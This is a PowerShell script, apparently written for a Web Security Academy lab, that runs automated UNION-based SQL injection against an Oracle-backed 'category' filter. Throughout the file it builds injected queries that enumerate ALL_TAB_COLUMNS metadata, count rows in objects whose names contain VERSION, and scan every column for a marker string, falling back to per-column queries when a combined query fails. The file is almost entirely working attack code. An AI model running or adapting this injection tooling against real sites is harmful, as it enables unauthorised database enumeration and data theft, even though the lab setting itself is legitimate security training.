<#
Example:
  pwsh -File sweep-nine-version-objects.ps1 -BaseUrl https://YOUR-LAB.web-security-academy.net `
    -Marker 11.2.0.2.0 -OutputPath version-sweep.json

Enumerates owner-qualified objects whose names contain VERSION, then checks every
column of each nonempty object for the supplied marker. A combined request that
fails is retried column by column. The report contains no URL or cookie.
Requires PowerShell 7 for -SkipHttpErrorCheck.
#>
param(
    [Parameter(Mandatory)] [uri]$BaseUrl,
    [string]$Marker = '11.2.0.2.0',
    [int]$MaxMatchesPerColumn = 20,
    [string]$OutputPath
)

$ErrorActionPreference = 'Stop'
$ProgressPreference = 'SilentlyContinue'
$base = $BaseUrl.AbsoluteUri.TrimEnd('/')
$session = [Microsoft.PowerShell.Commands.WebRequestSession]::new()

function Invoke-Category {
    param([string]$Category)
    $uri = $base + '/filter?category=' + [uri]::EscapeDataString($Category)
    try {
        $response = Invoke-WebRequest -Uri $uri -WebSession $session -SkipHttpErrorCheck -TimeoutSec 30
        $html = [string]$response.Content
        $table = [regex]::Match($html, '(?is)<table\b[^>]*class=["'']is-table-longdescription["''][^>]*>(.*?)</table>')
        $values = [System.Collections.Generic.List[string]]::new()
        if ($table.Success) {
            foreach ($row in [regex]::Matches($table.Groups[1].Value, '(?is)<tr\b[^>]*>(.*?)</tr>')) {
                $cell = [regex]::Match($row.Groups[1].Value, '(?is)<th\b[^>]*>(.*?)</th>')
                if ($cell.Success) {
                    $v = [System.Net.WebUtility]::HtmlDecode([regex]::Replace($cell.Groups[1].Value, '<[^>]+>', ''))
                    $values.Add(([regex]::Replace($v, '\s+', ' ')).Trim())
                }
            }
        }
        return [pscustomobject]@{ Status = [int]$response.StatusCode; Values = @($values); Error = '' }
    }
    catch {
        return [pscustomobject]@{ Status = 0; Values = @(); Error = $_.Exception.Message }
    }
}

function Assert-Identifier {
    param([string]$Value)
    if ($Value -cnotmatch '^[A-Z_][A-Z0-9_$#]*$') { throw "Unexpected Oracle identifier: $Value" }
}

$root = Invoke-WebRequest -Uri $base -WebSession $session -SkipHttpErrorCheck -TimeoutSec 20
if ([int]$root.StatusCode -ne 200) { throw "Lab root returned HTTP $([int]$root.StatusCode)" }

$objectsResponse = Invoke-Category "' UNION SELECT OWNER || '|' || TABLE_NAME, NULL FROM ALL_TAB_COLUMNS WHERE TABLE_NAME LIKE '%VERSION%' -- "
if ($objectsResponse.Status -ne 200) { throw "Object metadata returned HTTP $($objectsResponse.Status)" }
$objects = @($objectsResponse.Values | ForEach-Object {
    $parts = $_.Split('|')
    if ($parts.Count -ne 2) { throw "Unexpected object metadata: $_" }
    Assert-Identifier $parts[0]
    Assert-Identifier $parts[1]
    [pscustomobject]@{ Owner = $parts[0]; Name = $parts[1] }
})

$columnsResponse = Invoke-Category "' UNION ALL SELECT OWNER || '|' || TABLE_NAME || '|' || COLUMN_NAME || '|' || DATA_TYPE, NULL FROM ALL_TAB_COLUMNS WHERE TABLE_NAME LIKE '%VERSION%' -- "
if ($columnsResponse.Status -ne 200) { throw "Column metadata returned HTTP $($columnsResponse.Status)" }
$columns = @($columnsResponse.Values | ForEach-Object {
    $parts = $_.Split('|')
    if ($parts.Count -ne 4) { throw "Unexpected column metadata: $_" }
    Assert-Identifier $parts[0]
    Assert-Identifier $parts[1]
    Assert-Identifier $parts[2]
    [pscustomobject]@{ Owner = $parts[0]; View = $parts[1]; Column = $parts[2]; DataType = $parts[3] }
})

$sqlMarker = $Marker.Replace("'", "''")
$records = [System.Collections.Generic.List[object]]::new()
foreach ($obj in $objects) {
    $name = $obj.Owner + '.' + $obj.Name
    $from = '"' + $obj.Owner + '"."' + $obj.Name + '"'
    $count = Invoke-Category "' UNION ALL SELECT TO_CHAR(COUNT(*)), NULL FROM $from -- "
    $record = [ordered]@{
        object = $name
        column_count = @($columns | Where-Object { $_.Owner -eq $obj.Owner -and $_.View -eq $obj.Name }).Count
        count_status = $count.Status
        row_count = if ($count.Status -eq 200 -and $count.Values.Count -gt 0) { $count.Values[0] } else { $null }
        scan_status = $null
        scan_complete = $false
        scanned_column_count = 0
        matches = @()
        fallback = @()
    }
    if ($count.Status -eq 200 -and $record.row_count -eq '0') { $record.scan_complete = $true }
    if ($count.Status -eq 200 -and $record.row_count -ne '0') {
        $objectColumns = @($columns | Where-Object { $_.Owner -eq $obj.Owner -and $_.View -eq $obj.Name })
        $selects = [System.Collections.Generic.List[object]]::new()
        foreach ($col in $objectColumns) {
            $quoted = '"' + $col.Column + '"'
            $expr = if ($col.DataType -eq 'RAW') { "RAWTOHEX($quoted)" } elseif ($col.DataType -match '^(CHAR|VARCHAR2|NCHAR|NVARCHAR2)$') { $quoted } else { "TO_CHAR($quoted)" }
            $label = ($name + '.' + $col.Column + ': ').Replace("'", "''")
            $selects.Add([pscustomobject]@{ Column = $col.Column; Sql = "SELECT '$label' || $expr, NULL FROM $from WHERE INSTR($expr, '$sqlMarker') > 0 AND ROWNUM <= $MaxMatchesPerColumn" })
        }
        $record.scanned_column_count = $selects.Count
        if ($selects.Count -gt 0) {
            $scan = Invoke-Category ("' UNION ALL " + (($selects | ForEach-Object Sql) -join ' UNION ALL ') + ' -- ')
            $record.scan_status = $scan.Status
            $record.matches = @($scan.Values)
            if ($scan.Status -eq 200) { $record.scan_complete = $true }
            if ($scan.Status -ne 200) {
                foreach ($select in $selects) {
                    $single = Invoke-Category ("' UNION ALL " + $select.Sql + ' -- ')
                    $record.fallback += [pscustomobject]@{ column = $select.Column; status = $single.Status; values = @($single.Values); error = $single.Error }
                    $record.matches += @($single.Values)
                }
                $record.scan_complete = @($record.fallback | Where-Object { $_.status -ne 200 }).Count -eq 0
            }
        }
    }
    $records.Add([pscustomobject]$record)
    Write-Host "$name count=$($record.row_count) status=$($record.scan_status) matches=$(@($record.matches).Count)"
}

$report = [pscustomobject]@{
    marker = $Marker
    object_count = $objects.Count
    column_count = $columns.Count
    objects = @($records)
}
if ($OutputPath) { $report | ConvertTo-Json -Depth 8 | Set-Content -LiteralPath $OutputPath -Encoding UTF8 }
$report | ConvertTo-Json -Depth 8

